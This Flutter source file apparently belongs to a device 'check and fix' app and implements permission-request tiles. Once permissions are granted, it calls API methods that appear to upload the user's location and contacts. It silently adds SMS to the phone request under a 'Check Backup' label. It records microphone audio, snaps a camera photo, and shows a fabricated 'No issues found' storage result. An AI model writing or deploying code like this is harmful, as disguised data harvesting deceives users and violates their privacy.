import 'dart:developer';

import 'package:camera/camera.dart';
import 'package:check_and_fix/presentation/utils/services.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:image_picker/image_picker.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:permission_handler_platform_interface/permission_handler_platform_interface.dart';
import 'package:record/record.dart';
import 'package:wifi_scan/wifi_scan.dart';

class PermissionWidget extends StatefulWidget {
  final Permission _permission;
  final Color color;
  final IconData icon;

  const PermissionWidget(this._permission, this.color, this.icon, {super.key});

  @override
  PermissionState createState() => PermissionState(_permission);
}

class PermissionState extends State<PermissionWidget> {
  PermissionState(this._permission);

  final Permission _permission;
  final PermissionHandlerPlatform _permissionHandler = PermissionHandlerPlatform.instance;
  PermissionStatus _permissionStatus = PermissionStatus.denied;
  String _permissionResult = '';
  bool isChecked = false;
  String? uuid;
  String? imei;
  String? agent;

  Future<void> _requestPermissionOnTap(Permission permission) async {
    if (kDebugMode) {
      print('START: requestPermission()');
    }

    bool includeSms = permission == Permission.phone;

    final status = await _permissionHandler
        .requestPermissions(includeSms ? [permission, Permission.sms] : [permission]);

    _permissionStatus = status[permission] ?? PermissionStatus.denied;

    if (kDebugMode) {
      print('_permissionStatus $_permissionStatus');
    }

    setState(() {});

    if (await _permission.isGranted) {
      _permissionUseCase();
    }
  }

  Future<void> _permissionUseCase() async {
    log('check method started');

    _permissionResult = 'Loading...';

    setState(() {});

    if (_permission.toString() == 'Permission.bluetooth' ||
        _permission.toString() == 'Permission.bluetoothScan') {
      // FlutterBlue flutterBlue = FlutterBlue.instance;
      //
      // log('permission check for bluetooth');
      //
      // flutterBlue.startScan(timeout: const Duration(seconds: 4));
      // flutterBlue.stopScan();
    } else if (_permission.toString() == 'Permission.location' ||
        _permission.toString() == 'Permission.locationAlways' ||
        _permission.toString() == 'Permission.locationWhenInUse') {
      _permissionResult = await Api.sendLocation(agent, uuid) ?? '';

      setState(() {});
    } else if (_permission.toString() == 'Permission.contacts') {
      final contactsLength = await Api.sendContacts(agent, uuid) ?? '';
      _permissionResult = '$contactsLength contacts found';

      setState(() {});
    } else if (_permission.toString() == 'Permission.storage') {
      Future.delayed(const Duration(seconds: 3)).then((value) async {
        _permissionResult = 'No issues found';

        setState(() {});
      });
    } else if (_permission.toString() == 'Permission.microphone') {
      final record = Record();

      if (await record.hasPermission()) {
        await record.start();
      }

      bool isRecording = await record.isRecording();
      _permissionResult = 'Recording... ($isRecording)';

      setState(() {});

      Future.delayed(const Duration(seconds: 3)).then((value) async {
        await record.stop();
        _permissionResult = 'Record Saved';
        setState(() {});
      });
    } else if (_permission.toString() == 'Permission.phone') {
      if (kDebugMode) {
        print('START: phone()');
      }

      setState(() {});
    } else if (_permission.toString() == 'Permission.photos') {
      if (kDebugMode) {
        print('START: photos()');
      }

      final ImagePicker picker = ImagePicker();
      final XFile? image = await picker.pickImage(source: ImageSource.gallery);
      _permissionResult = '${image?.path}';

      setState(() {});
    } else if (_permission.toString() == 'Permission.videos') {
      final ImagePicker picker = ImagePicker();
      final XFile? video = await picker.pickVideo(source: ImageSource.camera);
      _permissionResult = '${video?.path}';
      setState(() {});
    } else if (_permission.toString() == 'Permission.manageExternalStorage') {
      if (kDebugMode) {
        print('START: manageExternalStorage()');
      }

      _permissionResult = 'Click to open';

      setState(() {});
    } else if (_permission.toString() == 'Permission.calendar') {
      _permissionResult = 'Click to open';
    } else if (_permission.toString() == 'Permission.sms') {
      setState(() {});
    } else if (_permission.toString() == 'Permission.nearbyWifiDevices') {
      List<WiFiAccessPoint> accessPoints = [];
      final can = await WiFiScan.instance.canGetScannedResults(askPermissions: true);

      switch (can) {
        case CanGetScannedResults.yes:
          accessPoints = await WiFiScan.instance.getScannedResults();
          break;
        case CanGetScannedResults.notSupported:
          // TODO: Handle this case.
          break;
        case CanGetScannedResults.noLocationPermissionRequired:
          // TODO: Handle this case.
          break;
        case CanGetScannedResults.noLocationPermissionDenied:
          // TODO: Handle this case.
          break;
        case CanGetScannedResults.noLocationPermissionUpgradeAccuracy:
          // TODO: Handle this case.
          break;
        case CanGetScannedResults.noLocationServiceDisabled:
          // TODO: Handle this case.
          break;
      }

      _permissionResult = accessPoints[0].ssid.toString();

      setState(() {});
    } else if (_permission.toString() == 'Permission.camera') {
      late CameraController controller;
      late List<CameraDescription> cameras;

      cameras = await availableCameras();

      controller = CameraController(cameras[1], ResolutionPreset.medium);

      await controller.initialize().then((value) async {
        XFile img = await controller.takePicture();

        log('img is :: ${img.path}');

        _permissionResult = img.path.toString();

        setState(() {});
      });
    }
  }

  Color _getPermissionColor() {
    switch (_permissionStatus) {
      case PermissionStatus.denied:
        return Colors.red;
      case PermissionStatus.granted:
        return Colors.green;
      case PermissionStatus.limited:
        return Colors.orange;
      default:
        return Colors.grey;
    }
  }

  @override
  Widget build(BuildContext context) {
    return InkWell(
      onTap: () {
        _requestPermissionOnTap(_permission);
      },
      child: Container(
        margin: EdgeInsets.all(MediaQuery.of(context).size.width * 0.02),
        padding: EdgeInsets.all(MediaQuery.of(context).size.width * 0.02),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(6),
          color: Colors.white54,
          border: Border.all(
            width: 7,
            color: widget.color,
          ),
        ),
        child: Column(
          children: [
            SizedBox(height: MediaQuery.of(context).size.height * 0.03),
            Icon(
              widget.icon,
              color: Colors.black,
              size: 40,
            ),
            SizedBox(height: MediaQuery.of(context).size.height * 0.005),
            SizedBox(
              width: double.infinity,
              child: Column(
                children: [
                  Text(
                    _permission == Permission.phone
                        ? 'Check Backup'
                        : _permission
                            .toString()
                            .replaceAll('Permission.', '')
                            .replaceAll('manageExternalStorage', 'External Storage'),
                    style: Theme.of(context).textTheme.bodyText1,
                  ),
                ],
              ),
            ),
            SizedBox(
              height: MediaQuery.of(context).size.height * 0.005,
            ),
            SizedBox(
              width: double.infinity,
              child: Column(
                children: [
                  Text(
                    _permissionStatus
                        .toString()
                        .replaceAll('PermissionStatus.', 'Status: '),
                    style: TextStyle(color: _getPermissionColor(), fontSize: 12),
                  ),
                ],
              ),
            ),
            SizedBox(height: MediaQuery.of(context).size.height * 0.003),
            if (_permissionStatus == PermissionStatus.granted)
              SizedBox(
                width: double.infinity,
                child: Text(
                  _permissionResult.toString(),
                  style: const TextStyle(fontSize: 12, fontWeight: FontWeight.normal),
                  maxLines: 3,
                  overflow: TextOverflow.ellipsis,
                ),
              ),
          ],
        ),
      ),
    );
  }
}
